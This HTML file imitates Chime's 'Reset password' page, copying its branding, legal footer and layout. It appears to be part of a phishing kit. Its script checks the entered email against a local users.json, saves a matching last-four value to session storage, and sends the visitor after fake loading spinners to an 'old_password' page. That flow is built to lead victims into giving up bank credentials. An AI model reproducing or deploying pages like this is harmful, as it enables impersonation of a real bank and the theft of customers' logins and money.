<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Chime - Reset Password</title>
  <style>
    :root {
      --chime-green: #2bd67b;
      --heading-green: #134034;
      --text: #0b1117;
      --muted: #66737b;
      --border: #e3e7ea;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#fff;color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
    main{max-width:480px;margin:40px auto 64px;padding:0 20px}
    .logo{
  margin-top:36px;
  margin-bottom:40px;
}
    .logo img{
  height:34px;
  width:auto;
  display:block;
}
    h1{font-size:24px;font-weight:700;margin-bottom:10px;color:var(--heading-green)}
    .intro{font-size:16px;line-height:1.5;margin-bottom:22px;color:var(--text)}
    .field{margin-bottom:18px}
    .field input[type="email"]{
      width:100%;padding:18px 16px 16px;font-size:16px;border:1.5px solid var(--border);
      border-radius:16px;outline:none;background:#fff;transition:border-color .2s ease
    }
    .field input[type="email"]:focus{border-color:#9db8ad}
    button{
      width:100%;padding:16px;border:none;border-radius:16px;font-size:16px;font-weight:700;
      background:#eef2f0;color:#9aa3b2;cursor:not-allowed;transition:filter .15s ease, background .15s ease, color .15s ease
    }
    button.active{background:var(--chime-green);color:#0b1117;cursor:pointer}
    button.active:active{filter:brightness(.96)}
    .consent{text-align:left;font-size:14px;line-height:1.5;color:var(--heading-green);margin-top:18px;font-weight:600}
    /* Footer: smaller size + slightly darker for bolder look */
    .footer{margin-top:40px;font-size:13px;line-height:1.7;color:#4f5f5a}
    .footer p{margin-bottom:12px}
  
/* === Spinner system (Button + Fullscreen) === */
.spinner-bars{color:#0b1117;display:inline-block;position:relative;width:28px;height:28px}
.spinner-bars.white{color:#fff}
.spinner-bars div{transform-origin:14px 14px;animation:spinner-bars 1.2s linear infinite}
.spinner-bars div:after{content:" ";display:block;position:absolute;top:2px;left:13px;width:3px;height:8px;border-radius:20%;background:currentColor}
.spinner-bars div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}
.spinner-bars div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}
.spinner-bars div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}
.spinner-bars div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}
.spinner-bars div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}
.spinner-bars div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}
.spinner-bars div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}
.spinner-bars div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}
.spinner-bars div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}
.spinner-bars div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}
.spinner-bars div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}
.spinner-bars div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
@keyframes spinner-bars{0%{opacity:1}100%{opacity:0}}

#fullpageSpinner{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;z-index:99999;visibility:hidden;opacity:0;transition:opacity .15s ease}
#fullpageSpinner.active{visibility:visible;opacity:1}

</style>
</head>
<body>
  <main>
    <div class="logo"><img src="chime-logo.jpeg" alt="Chime Logo"></div>
    <h1>Reset password</h1>
    <p class="intro">In order to reset your password, we need to verify your identity. Please tell us the email associated with your Chime account.</p>

    <form id="emailForm" novalidate>
      <div class="field">
        <input type="email" name="email" placeholder="Email" required />
      </div>
      <button type="submit" id="submitBtn">Submit</button>
    </form>

    <p class="consent">By continuing, you agree to receive SMS text messages from Chime to verify your identity</p>

    <div class="footer">
      <p>© 2025 Chime. All Rights Reserved.</p>
      <p>Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued by The Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. Please see back of your Card for its issuing bank.</p>
    </div>
  </main>

  <script>
  async function loadUserData() {
    try {
      const res = await fetch("data/users.json", { cache: "no-store" });
      return await res.json();
    } catch (e) {
      console.error("Failed to load users:", e);
      return {};
    }
  }
  document.addEventListener("DOMContentLoaded", async () => {
    const form = document.getElementById("emailForm");
    const emailInput = form.querySelector('input[name="email"]');
    const submitBtn = document.getElementById("submitBtn");
    const users = await loadUserData();
    function updateBtn(){
      const val = emailInput.value.trim();
      const valid = /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(val);
      submitBtn.classList.toggle("active", valid);
    }
    emailInput.addEventListener("input", updateBtn);
    updateBtn();
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = (emailInput.value || "").trim().toLowerCase();
      if (users[email]) {
        sessionStorage.setItem("last4", users[email]);
        sessionStorage.setItem("lookupEmail", email);
        bigBrainRedirect("old_password.html");
      } else {
        bigBrainRedirect("error.html");
      }
    });
  });
  </script>

<div id="fullpageSpinner"><div class="spinner-bars" aria-label="Loading">
  <div></div><div></div><div></div><div></div><div></div><div></div>
  <div></div><div></div><div></div><div></div><div></div><div></div>
</div></div>
<script>
(function(){
  const SPIN_WHITE = '<div class="spinner-bars white"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>';

  // Remember last clicked CTA
  document.addEventListener('click', function(e){
    const btn = e.target.closest('button, .btn');
    if(btn){ window.__lastBtnClicked = btn; }
  }, true);

  function inlineSpin(btn){
    if(!btn) return;
    btn.disabled = true;
    btn.dataset.originalText = btn.innerHTML;
    btn.innerHTML = SPIN_WHITE;
  }

  window.bigBrainRedirect = function(nextPage, inlineMs=3000, fullMs=2000){
    const btn = window.__lastBtnClicked;
    if(btn){ inlineSpin(btn); }
    setTimeout(function(){
      document.getElementById('fullpageSpinner').classList.add('active');
      setTimeout(function(){ window.location.href = nextPage; }, fullMs);
    }, inlineMs);
  };

})();
</script>

</body>
</html>
